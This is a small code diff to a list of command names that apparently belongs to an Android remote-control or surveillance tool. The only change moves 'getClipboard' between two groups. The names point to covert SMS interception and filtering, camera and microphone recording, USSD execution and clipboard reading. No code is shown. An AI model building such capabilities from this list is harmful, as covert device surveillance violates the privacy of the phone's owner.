@@ -2,13 +2,13 @@
     [
         "openUrl", "sendToast", "vibratePhone",
         "getGeoLocation", "receiveSMS",
-        "getInstalledApps", "getClipboard", "runUSSD",
+        "getInstalledApps", "runUSSD",
         "lockScreen", "unlockScreen",
         "sendNotification"
     ],
     [
         "getAllSMS", "takeScreenshot", "takeBackshot", "takeFrontshot", "setSoundVolume",
         "recordFront", "recordBack", "recordMicrophone", "getPhoneNumbers", "getPhoneNumberInfo",
-        "sendSMS", "setSMSFilter", "removeSMSFilter"
+        "sendSMS", "setSMSFilter", "removeSMSFilter", "getClipboard"
     ]
 ]
